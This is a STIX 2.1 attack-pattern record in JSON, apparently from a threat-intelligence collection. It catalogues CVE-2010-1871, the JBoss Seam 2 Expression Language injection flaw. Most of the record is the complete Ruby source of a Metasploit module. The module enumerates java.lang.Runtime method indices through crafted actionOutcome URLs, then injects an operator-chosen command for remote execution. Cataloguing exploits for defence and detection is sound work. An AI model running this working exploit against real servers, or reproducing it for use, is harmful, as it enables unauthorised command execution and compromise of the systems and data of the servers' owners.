{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1035b6de-b1c8-466c-a4a9-73415fb96a0f",
    "created": "2024-08-14T16:23:10.800414Z",
    "modified": "2024-08-14T16:23:10.800418Z",
    "name": "JBoss Seam 2 Remote Command Execution",
    "description": " JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform 4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression Language (EL) expressions, which allows remote attackers to execute arbitrary code",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/jboss_seam_exec.rb",
            "external_id": "jboss_seam_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1871"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'JBoss Seam 2 Remote Command Execution',\n        'Description' => %q{\n          JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform\n          4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression\n          Language (EL) expressions, which allows remote attackers to execute arbitrary code\n          via a crafted URL. This modules also has been tested successfully against IBM\n          WebSphere 6.1 running on iSeries.\n\n          NOTE: this is only a vulnerability when the Java Security Manager is not properly\n          configured.\n        },\n        'Author' => [\n          'guerrino di massa', # Metasploit module\n          'Cristiano Maruti <cmaruti[at]gmail.com>' # Support for IBM Websphere 6.1\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2010-1871' ],\n          [ 'OSVDB', '66881']\n        ],\n        'DisclosureDate' => '2010-07-19'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),\n        OptString.new('CMD', [ true, 'The command to execute.'])\n      ]\n    )\n  end\n\n  def run\n    uri = normalize_uri(target_uri.to_s)\n    cmd_enc = ''\n    cmd_enc << Rex::Text.uri_encode(datastore['CMD'])\n\n    flag_found_one = 255\n    flag_found_two = 255\n\n    uri_part_1 = \"?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[\"\n    uri_part_2 = \"].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[\"\n    uri_part_3 = \"].invoke(null),'\"\n\n    25.times do |index|\n      req = uri + uri_part_1 + index.to_s + ']}'\n\n      res = send_request_cgi(\n        {\n          'uri' => req,\n          'method' => 'GET'\n        }, 20\n      )\n\n      if (res && res.headers['Location'] =~ (/java.lang.Runtime.exec%28java.lang.String%29/))\n        flag_found_one = index\n        print_status('Found right index at [' + index.to_s + '] - exec')\n      elsif (res && res.headers['Location'] =~ (/java.lang.Runtime\\+java.lang.Runtime.getRuntime/))\n        print_status('Found right index at [' + index.to_s + '] - getRuntime')\n        flag_found_two = index\n      else\n        print_status('Index [' + index.to_s + ']')\n      end\n    end\n\n    if (flag_found_one != 255 && flag_found_two != 255)\n      print_status('Target appears VULNERABLE!')\n      print_status('Sending remote command:' + datastore['CMD'])\n\n      req = uri + uri_part_1 + flag_found_one.to_s + uri_part_2 + flag_found_two.to_s + uri_part_3 + cmd_enc + \"')}\"\n\n      res = send_request_cgi(\n        {\n          'uri' => req,\n          'method' => 'GET'\n        }, 20\n      )\n\n      if (res && res.headers['Location'] =~ (/pwned=java.lang.UNIXProcess/))\n        print_good('Exploited successfully')\n      else\n        print_error('Exploit failed')\n      end\n    else\n      print_error('Target appears not vulnerable!')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-07-19"
}